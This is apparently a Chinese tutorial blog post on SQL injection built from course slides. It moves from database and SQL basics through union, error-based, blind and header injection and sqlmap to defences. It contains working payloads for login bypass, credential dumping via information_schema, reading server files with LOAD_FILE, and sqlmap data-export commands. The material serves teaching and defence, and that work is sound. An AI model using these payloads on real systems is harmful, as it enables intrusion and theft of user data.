---
title: "SQL 注入基础及其原理"
date: "2026-11-14T15:31:28+08:00"
tags:
  - CTF
  - Web安全
  - SQL注入
description: "从数据库与 SQL 语法入手解释注入成因，梳理联合查询、报错注入、盲注、HTTP 头注入和 sqlmap 的使用场景及相应防御思路。"
---

> 本文根据深信服 SCSA-S 课程《SQL 注入》六节课件整理，覆盖数据库基础、SQL 语法、注入原理与分类、联合查询、报错注入、盲注、HTTP 头注入、sqlmap 与防御。靶场部分见《SQL 注入 CTFHub 实战 10 题》。

# 引言

SQL 注入（SQL Injection）是服务端漏洞：应用把用户输入拼接进 SQL 语句，用户输入改变了原语句的结构或语义，从而绕过验证、读取或修改数据库中的数据，严重时可以读写文件或执行系统命令。

与 XSS 不同，SQL 注入的攻击对象是数据库和应用服务器，受害者通常是网站本身及其用户数据。理解 SQL 注入需要先掌握数据库结构、SQL 语法和应用的查询方式。

---

# 一、数据库基础

## 1.1 数据库、DBMS 与数据库系统

课件给出的定义：

- **数据库（Data Base，DB）**：存储在磁带、磁盘、光盘或其他外存介质上，按一定结构组织在一起的相关数据的集合。
- **数据库管理系统（Data Base Management System，DBMS）**：操纵和管理数据库的大型软件，用于建立、使用和维护数据库。
- **数据库系统（Data Base System，DBS）**：通常由软件、数据库和数据库管理员组成；软件包括操作系统、宿主语言、实用程序以及 DBMS。

数据库由 DBMS 统一管理，数据的插入、修改和检索都通过 DBMS 进行。数据库管理员负责创建、监控和维护数据库。

典型 Web 体系结构中，浏览器请求 Web 应用，Web 应用通过数据库驱动连接 DBMS，DBMS 管理实际数据文件。

## 1.2 关系型数据库与非关系型数据库

**关系型数据库**把复杂的数据结构归结为二维表，通过 SQL 存储和查询数据，保持数据一致性，遵循 ACID 理论。

典型产品：

- MySQL
- Microsoft SQL Server
- Oracle
- PostgreSQL
- IBM DB2
- Access

**非关系型数据库**（NoSQL，Not Only SQL）是关系型数据库的补充，适合特定场景的高性能存储。

典型产品：

- Memcached
- Redis
- MongoDB

## 1.3 ACID

- **原子性（Atomicity）**：事务是不可分割的单位，事务中的操作要么都发生，要么都不发生。
- **一致性（Consistency）**：事务前后数据的完整性保持一致。
- **隔离性（Isolation）**：多个并发事务之间相互隔离，一个事务的操作不被其他事务干扰。
- **持久性（Durability）**：事务提交后，对数据的改变是永久性的，即使数据库故障也不应受影响。

## 1.4 常见数据库产品

**Oracle**：甲骨文公司的关系型数据库，功能强、复杂度高，常用于大型企业。

**MySQL**：开源关系型数据库，Web 应用中使用广泛。默认端口 3306。

**Microsoft SQL Server**：微软的关系型数据库，与 Windows 生态集成度高；SQL Server 2017 起支持 Linux。默认端口 1433。

**PostgreSQL**：加州大学伯克利分校开发的开源对象关系型数据库，稳定性强。默认端口 5432。

**Memcached**：分布式内存对象缓存系统，key-value 存储，常用于减轻数据库负载。默认端口 11211。

**Redis**：key-value 存储系统，支持 string、list、set、zset 等结构。默认端口 6379。

**MongoDB**：面向文档的数据库，使用类似 JSON 的 BSON 格式。默认端口 27017。

国内自主研发的关系型数据库包括达梦（DM）、人大金仓（Kingbase）、神舟通用（OSCAR）、南大通用（GBase）等。

---

# 二、识别数据库

## 2.1 默认端口

| 数据库 | 默认端口 |
| --- | --- |
| Oracle | 1521 |
| MySQL | 3306 |
| SQL Server | 1433 |
| PostgreSQL | 5432 |
| MongoDB | 27017 |
| Redis | 6379 |
| Memcached | 11211 |

端口只是线索，不能作为唯一依据；目标可能修改默认端口，也可能通过代理访问。

## 2.2 报错信息

不同数据库的报错格式不同：

- MySQL 常见 `You have an error in your SQL syntax`；
- SQL Server 常见 `Unclosed quotation mark after the character string`；
- Oracle 常见 `ORA-00933`、`ORA-01756` 等错误码。

报错信息可以直接暴露数据库类型，因此生产环境应关闭详细错误回显。

## 2.3 版本查询

| 数据库 | 版本查询语句 |
| --- | --- |
| MySQL | `select version()` 或 `select @@version` |
| SQL Server | `select @@version` |
| Oracle | `select banner from v$version` |
| PostgreSQL | `select version()` |

## 2.4 其他识别方式

- Web 技术栈：ASP/.NET 常搭配 SQL Server，PHP 常搭配 MySQL/PostgreSQL，Java 常搭配 Oracle/MySQL；
- 字符串处理差异：不同数据库的字符串连接、注释、分页语法不同；
- 盲跟踪：根据页面行为、布尔条件、时间延迟推断；
- 非盲跟踪：报错、直接查询。

---

# 三、SQL 语法基础

## 3.1 库、表、字段、值

关系型数据库的层级：

- 数据库（database）；
- 表（table）；
- 列/字段（column）；
- 行/记录（row）；
- 每个字段对应的值（value）。

例如数据库 `college` 中的表 `offices`，字段包括 `officeCode`、`city`、`phone` 等。

## 3.2 SQL 命令分类

标准 SQL 命令包括 `CREATE`、`SELECT`、`INSERT`、`UPDATE`、`DELETE`、`DROP` 等，分为三组：

| 类别 | 命令 | 作用 |
| --- | --- | --- |
| 数据定义 | `CREATE`、`ALTER`、`DROP` | 创建、修改、删除表或其他对象 |
| 数据操纵 | `SELECT`、`INSERT`、`UPDATE`、`DELETE` | 查询、插入、修改、删除记录 |
| 数据控制 | `GRANT`、`REVOKE` | 赋予或收回权限 |

基本操作：

```sql
CREATE DATABASE testdb;
CREATE TABLE table_name (column_name column_type);
UPDATE table_name SET field1=new_value1, field2=new_value2 WHERE condition;
DELETE FROM table_name WHERE condition;
```

## 3.3 查询与排序

```sql
SELECT * FROM test_table ORDER BY userid;
SELECT name, COUNT(*) FROM test_table GROUP BY name;
SELECT * FROM test_table LIMIT 0,10;
SELECT * FROM test_table LIMIT 1,5;
```

`ORDER BY` 用于排序。注入测试中常用 `ORDER BY N` 判断字段数：当 N 超过实际字段数时，数据库报错。

`LIMIT m,n` 中，`m` 是起始索引（从 0 开始），`n` 是返回条数。例如 `LIMIT 3,7` 返回第 4 到第 10 行。

## 3.4 GROUP BY 与执行顺序

`GROUP BY` 按指定规则分组，通常配合聚合函数 `SUM()`、`COUNT()`、`AVG()` 使用。

当查询同时出现 `WHERE`、`GROUP BY`、`HAVING`、`ORDER BY` 时，逻辑执行顺序为：

1. `WHERE` 对全表数据筛选；
2. `GROUP BY` 对结果分组；
3. `SELECT` 对每组执行；
4. `HAVING` 对分组结果筛选；
5. `ORDER BY` 排序。

## 3.5 UNION 联合查询

`UNION` 用于合并两个查询的结果集。要求：

- 两个查询的列数相同；
- 对应列的数据类型兼容。

```sql
SELECT * FROM test_table UNION SELECT 1,2,3;
```

注入中常用 `ORDER BY` 或 `UNION SELECT 1,2,3...` 判断列数；列数一致后，再把目标数据放到有回显的位置。

## 3.6 information_schema

MySQL 5.5 及以上版本自带 `information_schema` 数据库，保存其他数据库的元数据：

- `SCHEMATA`：数据库名，字段 `SCHEMA_NAME`；
- `TABLES`：表名和所属数据库，字段 `TABLE_NAME`、`TABLE_SCHEMA`；
- `COLUMNS`：字段名、所属表和数据库，字段 `COLUMN_NAME`、`TABLE_NAME`、`TABLE_SCHEMA`。

查询示例：

```sql
SELECT TABLE_NAME, TABLE_SCHEMA FROM information_schema.TABLES WHERE TABLE_SCHEMA = "haha";
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;
```

## 3.7 exists() 与 load_file()

`EXISTS(subquery)` 检查子查询是否至少返回一行，返回 `TRUE` 或 `FALSE`，常用于盲注中猜解表名。

`LOAD_FILE(file_name)` 读取服务器文件并返回字符串。前提条件：

- 文件位于服务器上，必须使用完整路径；
- 当前数据库用户拥有 `FILE` 权限；
- MySQL 配置中 `secure_file_priv` 不能为 `NULL`；
- 文件可读，且大小小于 `max_allowed_packet`；
- 条件不满足时返回 `NULL`。

```sql
SELECT * FROM offices WHERE officecode=7 AND 1=2
UNION SELECT 0,0,0,LOAD_FILE("c:/test.txt") FROM offices;
```

---

# 四、SQL 注入原理

## 4.1 定义

课件定义：

> 攻击者利用 Web 应用程序对用户输入验证上的疏忽，在输入的数据中包含对某些数据库系统有特殊意义的符号或命令，让攻击者有机会直接对后台数据库系统下达指令，进而实现对后台数据库乃至整个应用系统的入侵。

更直接地说：服务端没有过滤用户输入，直接把输入当作 SQL 语句的一部分执行，改变了原查询的结构或语义。

## 4.2 两个条件

1. 用户能够控制输入；
2. 原本程序要执行的 SQL 语句，拼接了用户输入的恶意数据。

两个条件同时满足，才可能形成 SQL 注入。

## 4.3 典型示例

原查询：

```sql
SELECT username, password FROM users WHERE username='textvalue' AND password='textvalue2';
```

用户名输入 `' or 1=1 -- `：

```sql
SELECT username, password FROM users WHERE username='' or 1=1 -- ' AND password='textvalue2';
```

`-- ` 注释掉后面的密码条件，`or 1=1` 使条件恒真，从而绕过登录。

注意：`--` 后通常需要一个空格，MySQL 才会把它当作注释；`#` 也可以作为注释。

## 4.4 危害

- 绕过登录验证；
- 获取敏感数据，如管理员账号、密码；
- 读写文件、列目录；
- 操作注册表（SQL Server）；
- 执行系统命令；
- 篡改或删除数据；
- 作为进一步入侵的跳板。

## 4.5 形成原因

**动态字符串拼接**：

- 不正确地处理转义字符，可能导致宽字节注入；
- 不正确地处理错误，报错泄露信息；
- 不正确地处理联合查询；
- 不正确地处理多次提交，形成二次注入。

**后台问题**：

- 后台没有过滤或编码用户数据；
- 数据库可以拼接用户传递的恶意代码。

**错误处理不当**：

- 详细内部错误显示给用户；
- 错误信息为攻击者提供下一步线索。

**不安全的数据库配置**：

- 使用默认账户，如 SQL Server 的 `sa`、MySQL 的 `root`；
- 以高权限系统账户运行数据库服务；
- 数据库权限过大。

---

# 五、SQL 注入分类

## 5.1 按注入点类型分类

**数字型（整型）注入**：参数为整数，如 ID、年龄、页码。

```text
http://www.testweb.com/user.php?id=8
select ... from ... where id=$id ...
```

测试：

```text
?id=8'        返回错误，说明单引号未被处理
?id=8 and 1=1 正常
?id=8 and 1=2 异常
```

**字符型注入**：参数为字符串，通常需要用单引号闭合。

```text
http://www.testweb.com/test.php?user=admin
select ... from ... where id='$id' ...
```

测试：

```text
?user=admin' and '1'='1 正常
?user=admin' and '1'='2 异常
```

**搜索型注入**：搜索参数进入 `LIKE` 语句。

```sql
select * from 表名 where 字段 like '%关键字%'
```

提交 `keyword='and [查询条件] and '%'='` 后，语句变为：

```sql
select * from 表名 where 字段 like '%' and [查询条件] and '%'='%'
```

## 5.2 按注入技术分类

| 类型 | 判断依据 | 适用场景 |
| --- | --- | --- |
| 基于布尔的盲注 | 页面返回真/假两种结果 | 无回显、无报错 |
| 基于时间的盲注 | 响应时间是否延迟 | 页面只有一种结果 |
| 基于报错的注入 | 页面回显数据库错误 | 报错函数未过滤 |
| 联合查询注入 | 页面有回显位 | 列数可控、`UNION` 可用 |
| 堆查询注入 | 可同时执行多条语句 | 数据库驱动允许多语句 |

## 5.3 按注入位置分类

- GET 参数；
- POST 参数；
- Cookie；
- Host；
- User-Agent；
- Referer；
- X-Forwarded-For；
- 其他进入 SQL 语句的请求头或字段。

只要后端接收前端输入、未过滤并直接带入数据库，就可能构成注入点。

---

---

# 六、注入点与手工注入流程

## 6.1 寻找注入点

**GET 方法**：参数在 URL 中，可以直接修改地址栏或使用 HackBar。

```text
?text=value1&cat=value2&num=value3
```

**POST 方法**：数据在请求体中，URL 中不可见，需要用 Burp Suite 或浏览器扩展修改。

```http
POST /sqli-labs-master/Less-11/ HTTP/1.1
Host: 123.59.116.191
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

uname=w3g43we&passwd=h64j4wj5&submit=Submit
```

**其他注入点**：

- Cookie；
- Host；
- User-Agent；
- Referer；
- X-Forwarded-For。

## 6.2 判断注入是否存在

课件给出三类方法：

- 经典条件：`and 1=1`、`and 2>1`、`or 1=1`、`or 1<1`；
- 数据库函数：`sleep(4)=1`、`length(user())>3`；
- 特殊符号：单引号、双引号。

判断逻辑是：构造真条件和假条件，观察页面是否出现差异；或构造延时条件，观察响应时间。

## 6.3 手工注入步骤

1. 判断是否存在注入点；
2. 判断字段长度（字段数）；
3. 判断字段回显位置；
4. 判断数据库信息；
5. 查找数据库名；
6. 查找数据库表；
7. 查找表中字段及字段值；
8. 猜解账号密码；
9. 登录管理员后台。

实际测试中，步骤 4 到 7 可以借助 `information_schema` 一次性获取，减少请求。

---

# 七、联合查询注入

## 7.1 判断字段数

使用 `ORDER BY N`：

```sql
?id=1 ORDER BY 1
?id=1 ORDER BY 2
?id=1 ORDER BY 3
```

当 N 超过实际字段数时，数据库报错。也可以使用：

```sql
?id=1 UNION SELECT 1,2,3
```

列数不一致时 `UNION` 报错，列数一致时返回结果。

## 7.2 判断回显位

让原查询返回空，再执行 `UNION SELECT`：

```sql
?id=-1 UNION SELECT 1,2,3
```

页面中显示的数字就是回显位。把目标查询放到回显位：

```sql
?id=-1 UNION SELECT 1,database(),3
```

## 7.3 获取元数据

**当前数据库名**：

```sql
SELECT database();
```

**当前数据库的表**：

```sql
SELECT group_concat(table_name) FROM information_schema.tables
WHERE table_schema=database();
```

**指定表的字段**：

```sql
SELECT group_concat(column_name) FROM information_schema.columns
WHERE table_name="users";
```

**读取字段值**：

```sql
SELECT group_concat(username,0x3a,password) FROM users;
```

`group_concat()` 把多行结果拼成一行，适合单个回显位。结果过长时，可以配合 `substr()` 分段读取。

## 7.4 联合查询的限制

- 前后查询列数必须一致；
- 对应列的数据类型应兼容；
- 原查询有 `ORDER BY` 时，`UNION` 的排序行为需要注意；
- 页面必须有回显位，否则联合查询无法直接看到数据。

---

# 八、报错注入

## 8.1 原理

报错注入通过构造特定 SQL 语句，让数据库把查询结果带入错误信息，并显示在页面上。

前提条件：

- Web 应用未关闭数据库报错；
- 报错函数未被过滤；
- 页面会回显数据库错误。

## 8.2 XPath 函数

`extractvalue()` 和 `updatexml()` 适用于 MySQL 5.1.5 及以上版本。

**extractvalue()**：

```sql
extractvalue(XML_document, XPath_string)
```

正常 XPath 格式为 `/xxx/xxx`。如果传入非法格式，数据库报错并返回非法内容：

```sql
SELECT extractvalue(1,concat('~',user()));
```

错误信息：

```text
XPATH syntax error: '~root@localhost'
```

**updatexml()**：

```sql
updatexml(XML_document, XPath_string, new_value)
```

同样通过非法 XPath 触发错误：

```sql
SELECT updatexml(1,concat('~',user()),1);
```

报错信息最多显示 32 个字符，超过长度时使用 `substr()`、`limit` 分段读取。

## 8.3 floor() 与 group by

`floor()` 向下取整，`rand()` 生成 0 到 1 之间的随机浮点数，`count(*)` 统计记录数，`group by` 分组。

当 `group by` 与 `rand()` 联用时，临时表插入过程中可能重复计算 `rand()`，导致主键重复：

```sql
SELECT 1 FROM (
  SELECT count(*), concat(user(), floor(rand(0)*2)) x
  FROM information_schema.tables GROUP BY x
) a;
```

错误信息：

```text
Duplicate entry 'root@localhost1' for key 'group_key'
```

## 8.4 exp()

`exp(x)` 计算以 e 为底的幂值。当参数超过 710 时，函数报错：

```sql
SELECT exp(~(SELECT * FROM (SELECT user()) AS x));
```

错误信息：

```text
DOUBLE value is out of range
```

该方式主要适用于 MySQL 5.5.5 到 5.5.49。

## 8.5 报错函数对比

| 函数/组合 | 版本要求 | 报错类型 | 回显长度 |
| --- | --- | --- | --- |
| `extractvalue()` | MySQL >= 5.1.5 | XPath 语法错误 | 32 字符 |
| `updatexml()` | MySQL >= 5.1.5 | XPath 语法错误 | 32 字符 |
| `floor()` + `rand()` + `group by` | 5.5.x 及以上 | 主键重复 | 64 字符左右 |
| `exp()` | 5.5.5–5.5.49 | 数值溢出 | 受错误信息长度限制 |

不同版本、不同数据库的错误函数和回显长度不同，测试时需要以实际响应为准。

---

# 九、SQL 盲注

## 9.1 盲注的定义

SQL 语句执行后，查询结果不能回显到页面，只能通过页面内容或响应时间判断，这个过程称为盲注。

两类：

- **基于布尔的盲注**：页面只有真/假两种结果；
- **基于时间的盲注**：页面只有一种结果，通过延迟判断。

## 9.2 常用函数

| 函数 | 作用 | 语法 |
| --- | --- | --- |
| `if()` | 条件判断 | `if(expr1,expr2,expr3)` |
| `left()` | 截取左边指定长度 | `left(str,length)` |
| `length()` | 返回字符串长度 | `length(str)` |
| `substr()` / `substring()` | 截取子串 | `substr(str,pos,len)` |
| `ascii()` / `ord()` | 返回最左字符 ASCII 码 | `ascii(str)` |
| `cast()` / `convert()` | 类型转换 | `cast(value as type)` |
| `sleep()` | 延迟 N 秒 | `sleep(N)` |
| `benchmark()` | 重复执行表达式 | `benchmark(count,expr)` |

`if()` 仅 MySQL 支持；其他数据库使用 `CASE WHEN`、`DECODE` 等条件表达式。

## 9.3 布尔盲注

判断数据库名第一个字符是否为 `s`：

```sql
1 AND substr(database(),1,1) = 's'
```

页面返回正常表示条件为真，返回异常表示条件为假。

逐字符猜测效率低，可以用二分法：

```sql
1 AND ascii(substr(database(),1,1)) > 100
```

根据真假缩小 ASCII 范围，直到确定字符。

## 9.4 时间盲注

条件成立时触发延迟：

```sql
1 AND if(substr(database(),1,1)='a',1,sleep(5))
```

如果页面立即返回，条件为假；如果延迟约 5 秒，条件为真。

也可以写成：

```sql
1 AND if(ascii(substr(database(),1,1))>100,sleep(5),1)
```

时间盲注受网络抖动影响，阈值通常设为 `SLEEP * 0.7` 左右，并配合重试。

## 9.5 盲注脚本思路

1. 先判断字符串长度：`length((query)) >= pos`；
2. 对每个位置，用二分法确定 ASCII 码；
3. 拼接字符，直到长度结束；
4. 布尔盲注根据页面关键字判断，时间盲注根据响应时间判断。

盲注请求量大，需要控制并发、超时和请求间隔。

---

# 十、HTTP 头注入

## 10.1 原理

后台为了验证客户端身份或记录客户端信息，会读取 HTTP 请求头并拼进 SQL 语句。如果未过滤，就可能形成 Header 注入。

前提条件：

- 能够修改请求头；
- 修改的请求头内容能够带入数据库执行；
- 数据库没有对输入做过滤。

## 10.2 常见类型

**Cookie 注入**：服务器读取 Cookie 字段验证身份。

**Referer 注入**：服务器记录 Referer 统计点击量。

**User-Agent 注入**：服务器记录访问者的浏览器、操作系统信息，或根据 UA 推送不同页面。

**X-Forwarded-For 注入**：服务器记录客户端真实 IP，XFF 可被伪造。

## 10.3 测试方法

使用 Burp Suite 拦截请求，在对应的请求头中构造 payload：

```http
Cookie: id=-1 UNION SELECT 1,2
User-Agent: -1 UNION SELECT 1,2
Referer: -1 UNION SELECT 1,2
X-Forwarded-For: -1 UNION SELECT 1,2
```

根据页面回显、报错或响应时间判断注入类型。

## 10.4 插入型注入

如果后台使用 `INSERT` 语句记录请求头：

```sql
INSERT INTO uagents (uagent, ip_address, username) VALUES ('$uagent', '$IP', '$uname')
```

需要根据 `VALUES` 的结构闭合引号和括号，再构造报错或联合查询。与 `SELECT` 注入相比，插入型注入更需要注意语法闭合。

---

# 十一、sqlmap 基础

## 11.1 简介

sqlmap 是开源的自动化 SQL 注入工具，主要功能是扫描、发现并利用给定 URL 的 SQL 注入漏洞。

支持：

- 布尔盲注；
- 时间盲注；
- 报错注入；
- 联合查询注入；
- 堆查询注入。

支持 MySQL、Oracle、PostgreSQL、SQL Server、Access、DB2、SQLite 等数据库。

## 11.2 检测流程

1. 网站连通性检测；
2. WAF 探测；
3. 网页稳定性检测；
4. 参数动态性检测；
5. 启发式注入检测。

## 11.3 误报检测

sqlmap 的布尔盲注和时间盲注判断存在误报可能，因此引入误报检测机制：

- **页面相似度对比**：把成功响应与原始响应比较，判断是否相似；
- **高斯分布识别**：一组请求处理逻辑相同时，响应应几乎相同；出现明显变化可能意味着注入成功。

## 11.4 常用参数

**-u 指定 URL**：

```bash
sqlmap -u "http://www.test.com/index.php?id=1"
```

**获取当前库名**：

```bash
sqlmap -u "http://192.168.0.110/page.php?id=10" --current-db
```

**获取表名**：

```bash
sqlmap -u "http://192.168.0.110/page.php?id=10" -D 数据库名 --tables
```

**获取字段名**：

```bash
sqlmap -u "http://192.168.0.110/page.php?id=10" -D 数据库名 -T 表名 --columns
```

**导出数据**：

```bash
sqlmap -u "http://192.168.0.110/page.php?id=10" -D 数据库名 -T 表名 -C 字段名1,字段名2 --dump
```

**-r 从文件读取 HTTP 请求**：

```bash
sqlmap -r /usr/a.txt
```

适用于 POST 请求、需要 Cookie 或自定义请求头的场景。

**-m 从文件读取多个 URL**：

```bash
sqlmap -m /usr/b.txt
```

## 11.5 使用注意

- 自动化工具不能替代对注入原理的理解；
- 需要核对注入类型、数据库类型和回显结果；
- 请求过多可能影响目标稳定性；
- 只在授权环境中使用。

---

# 十二、SQL 注入防御

## 12.1 参数化查询

参数化查询把 SQL 语句和数据分开，数据只作为参数值传入，不参与语句结构解析。这是防御 SQL 注入的核心措施。

PDO 示例：

```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);
```

预处理语句示例：

```php
$stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?');
$stmt->bind_param('i', $id);
$stmt->execute();
```

## 12.2 输入验证与类型约束

- 数字参数使用整型转换或白名单；
- 字符串参数限制长度、字符集和格式；
- 排序字段、表名、列名等标识符不能直接参数化，应使用白名单映射；
- 不要依赖 `addslashes()`、`str_replace()` 等简单转义。

## 12.3 最小权限

- 数据库账户只授予业务所需权限；
- 应用账户不要使用 `root`、`sa` 等高权限账户；
- 禁止应用账户拥有 `FILE`、`PROCESS` 等不必要权限；
- 数据库服务以低权限系统用户运行。

## 12.4 错误处理

- 关闭详细数据库错误回显；
- 统一返回通用错误页面；
- 错误日志记录到服务端，不返回给客户端；
- 避免错误信息泄露数据库类型、表名、字段名。

## 12.5 其他措施

- 使用 ORM 或查询构建器，避免手写字符串拼接；
- 对进入 SQL 的请求头、Cookie、Referer 做校验；
- 部署 WAF 拦截常见注入 payload；
- 记录异常 SQL、异常请求和大量失败查询；
- 定期进行代码审计和渗透测试；
- 数据库版本升级，及时修复已知漏洞。

## 12.6 为什么过滤关键字不够

黑名单容易遗漏：

- 大小写、注释、编码、空白字符可以绕过；
- 不同数据库的语法差异；
- 注入点可能在请求头、Cookie、排序字段；
- 业务逻辑复杂时，关键字过滤难以覆盖所有上下文。

参数化查询从语法层面隔离数据与代码，比关键字过滤更可靠。

---

# 十三、总结

SQL 注入的核心是**用户输入改变了 SQL 语句的结构或语义**。需要掌握：

1. **数据库基础**：库、表、字段、ACID、常见数据库与端口；
2. **SQL 语法**：SELECT、WHERE、ORDER BY、LIMIT、GROUP BY、UNION、information_schema、load_file；
3. **注入原理**：两个条件、动态拼接、错误处理、危险配置；
4. **注入分类**：数字型、字符型、搜索型；布尔、时间、报错、联合、堆查询；
5. **注入点**：GET、POST、Cookie、UA、Referer、XFF；
6. **利用方式**：联合查询、报错注入、布尔盲注、时间盲注；
7. **自动化工具**：sqlmap 的检测流程与常用参数；
8. **防御**：参数化查询、最小权限、错误处理、输入校验、WAF、审计。

SQL 注入的测试应围绕“输入是否进入 SQL 语句、以什么方式拼接、页面如何反馈”三个问题展开。理解语句结构，比记忆单个 payload 更重要。
